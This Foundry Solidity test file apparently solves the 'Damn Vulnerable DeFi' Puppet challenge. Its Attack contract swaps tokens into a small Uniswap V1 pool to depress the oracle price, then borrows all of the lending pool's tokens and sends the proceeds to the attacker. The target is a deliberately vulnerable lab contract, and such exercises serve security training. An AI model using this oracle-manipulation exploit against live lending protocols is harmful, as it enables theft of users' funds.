// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@common/uniswap/UniswapV1Exchange.sol";
import "@common/DamnValuableToken.sol";

import "../src/PuppetPool.sol";
import "./Deployer.sol";

contract ProofsOfConcept is Test {
    address _user = makeAddr("user");
    address _attacker = makeAddr("attacker");

    uint256 constant ATTACKER_TOKENS = 1000 ether;
    uint256 constant ATTACKER_ETH = 25 ether;

    Deployer _deployer;

    DamnValuableToken _token;
    PuppetPool _pool;
    UniswapV1Exchange _exchange;

    constructor() {
        _deployer = new Deployer();
        (_token, _pool, _exchange) = _deployer.deploy{value: 10 ether}();

        console.log("Deployer address: %s", address(_deployer));
        console.log("Token address: %s", address(_token));
        console.log("Pool address: %s", address(_pool));
        console.log("Exchange address: %s", address(_exchange));
        console.log("This address: %s", address(this));
        console.log("constructor.msg.sender: %s", address(msg.sender));
    }

    function testHappyPath() external {
        assertEq(
            _exchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(1 ether, 10 ether, 10 ether)
        );

        vm.deal(_user, 1000 ether);

        console.log("LoanUser token balance: %d", _token.balanceOf(_user));
        console.log("LoanUser eth balance: %d", _user.balance);
        console.log("Pool token balance: %d", _token.balanceOf(address(_pool)));
        console.log("Pool eth balance: %d", address(_pool).balance);

        uint256 tokensToBorrow = 90_000;
        vm.prank(_user);
        _pool.borrow{value: tokensToBorrow * 2}(tokensToBorrow, _user);

        console.log("LoanUser token balance: %d", _token.balanceOf(_user));
        console.log("LoanUser eth balance: %d", _user.balance);
        console.log("Pool token balance: %d", _token.balanceOf(address(_pool)));
        console.log("Pool eth balance: %d", address(_pool).balance);
    }

    function testAttack() external {
        console.log("testAttack().msg.sender: %s", address(msg.sender));

        // Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.
        vm.deal(_attacker, ATTACKER_ETH);
        deal(address(_token), _attacker, ATTACKER_TOKENS);

        uint256 poolTokens = _deployer.POOL_INITIAL_TOKEN_BALANCE();

        assertEq(_token.balanceOf(address(_attacker)), ATTACKER_TOKENS);
        assertEq(_token.balanceOf(address(_pool)), poolTokens);

        vm.startPrank(_attacker);
        Attack attack = new Attack(_token, _pool, _exchange);
        _token.approve(address(attack), ATTACKER_TOKENS);
        attack.attack{value: ATTACKER_ETH}(poolTokens, ATTACKER_TOKENS);

        assertGt(_token.balanceOf(address(_attacker)), poolTokens);
        assertEq(_token.balanceOf(address(_pool)), 0);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(
        uint256 tokensSold,
        uint256 tokensInReserve,
        uint256 etherInReserve
    ) internal pure returns (uint256) {
        return
            (tokensSold * 997 * etherInReserve) /
            (tokensInReserve * 1000 + tokensSold * 997);
    }
}

contract Attack {
    using Address for address payable;

    DamnValuableToken _token;
    PuppetPool _pool;
    UniswapV1Exchange _exchange;

    constructor(
        DamnValuableToken token,
        PuppetPool pool,
        UniswapV1Exchange exchange
    ) {
        _token = token;
        _pool = pool;
        _exchange = exchange;
    }

    function attack(uint256 poolTokens, uint256 senderTokens) external payable {
        // deposit all tokens in uniswap, get eth
        _exchange.tokenToEthSwapInput(
            senderTokens,
            0, // min eth
            block.timestamp + 1 hours
        );

        // borrow all tokens from the pool
        _pool.borrow{value: address(this).balance}(poolTokens, msg.sender);

        // send everything to sender
        _token.transfer(msg.sender, _token.balanceOf(address(this)));
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
